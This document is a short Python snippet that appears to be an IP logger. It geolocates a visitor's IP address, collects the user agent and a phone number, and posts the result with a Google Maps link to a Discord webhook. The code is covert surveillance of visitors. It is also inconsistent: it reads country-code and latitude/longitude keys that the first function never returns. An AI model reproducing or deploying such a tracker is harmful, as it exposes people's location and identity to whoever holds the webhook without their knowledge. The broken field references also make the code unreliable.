def get_visitor_info(ip, user_agent, phone_number):
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if r.status_code == 200:
            details = r.json()
        else:
            details = {}
            print(f"API Error: Received status code {r.status_code}")
    except Exception as e:
        details = {}
        print(f"API Exception: {e}")

    # Add phone number and fallbacks if data is missing
    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "city": details.get("city", "Unknown City"),
        "phone_number": phone_number or "Not Provided",
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
    if not requests.head(flag_url).status_code == 200:
        flag_url = "https://example.com/default-flag.png"

    embed = {
        "username": "PUTA BARCA",
        "avatar_url": flag_url,
        "embeds": [{
            "title": f"🌍 Visitor From {info['country']}",
            "color": 39423,
            "fields": [
                {"name": "IP & City", "value": f"{info['ip']} ({info['city']})", "inline": True},
                {"name": "User Agent", "value": info["user_agent"], "inline": False},
                {"name": "Phone Number", "value": info["phone_number"], "inline": True},
                {"name": "Country / Code", "value": f"{info['country']} / {info['countryCode']}", "inline": True},
                {"name": "Google Maps", "value": f"[View Location](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
            ],
            "footer": {
                "text": f"Time (GMT): {info['date']} {info['time']}",
                "icon_url": "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
            }
        }]
    }

    headers = {"Content-Type": "application/json"}
    response = requests.post(DISCORD_WEBHOOK_URL, json=embed, headers=headers)
    print(f"Discord webhook response: {response.status_code}")
